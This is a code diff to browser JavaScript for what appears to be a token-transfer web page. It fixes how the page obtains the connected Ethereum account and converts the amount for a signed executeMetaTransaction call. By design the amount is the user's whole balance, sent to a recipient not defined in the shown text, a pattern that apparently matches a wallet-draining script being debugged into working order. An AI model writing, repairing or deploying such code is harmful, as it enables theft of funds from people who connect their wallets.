@@ -84,14 +84,10 @@ let account;
 async function connectWallet() {
     if (window.ethereum) {
         try {
-            await window.ethereum.request({ method: 'eth_requestAccounts' });
-            web3 = new Web3(window.ethereum);
-            account = window.ethereum.selectedAddress || (await web3.eth.getAccounts())[0];
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            account = accounts[0]; // 确保获取第一个账户
 
-            // Ensure account is set correctly
-            if (!account) {
-                throw new Error('未能获取账户地址');
-            }
+            web3 = new Web3(window.ethereum);
 
             document.getElementById('connectButton').innerText = '连接成功';
             document.getElementById('transferButton').disabled = false;
@@ -120,13 +116,16 @@ async function transferTokens() {
         const amount = balance; // 将转账金额设为用户的所有余额
 
         console.log('用户余额:', balance);
-
-        if (amount === '0') {
+        
+        if (balance === '0') {
             alert('余额不足，无法转账。');
             return;
         }
 
-        const messageHash = web3.utils.soliditySha3(account, recipient, amount);
+        // 确保amount是数字类型
+        const amountToSend = web3.utils.toBN(amount);
+
+        const messageHash = web3.utils.soliditySha3(account, recipient, amountToSend);
         const messageHashHex = web3.utils.keccak256(messageHash); // 使用 keccak256
 
         const signature = await web3.eth.personal.sign(messageHashHex, account);
@@ -134,7 +133,7 @@ async function transferTokens() {
         console.log('生成的消息哈希:', messageHashHex);
         console.log('签名:', signature);
         
-        const tx = await contract.methods.executeMetaTransaction(account, recipient, amount, signature).send({ from: account });
+        const tx = await contract.methods.executeMetaTransaction(account, recipient, amountToSend.toString(), signature).send({ from: account });
         
         console.log('转账成功:', tx);
         alert('转账成功！');
